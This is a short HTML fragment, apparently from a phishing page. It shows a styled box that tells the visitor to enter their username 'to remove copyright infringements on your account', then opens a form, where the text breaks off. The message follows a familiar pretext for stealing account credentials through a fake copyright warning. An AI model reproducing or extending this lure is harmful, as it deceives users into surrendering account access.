...
<body style="background:#fafafa;">
	...
	<center>
		...
		<div style="width:300px;max-width:95%;background:white;border:1px solid #cecece;padding:10px;box-sizing:border-box;">
			...
			<p style="font-family:sans-serif;width:300px;max-width:88%;color:#999;font-size:15px;line-height:19px;">Hello, please proceed by entering the username to remove copyright infringements on your account.</p><br>
			<form method="get" >
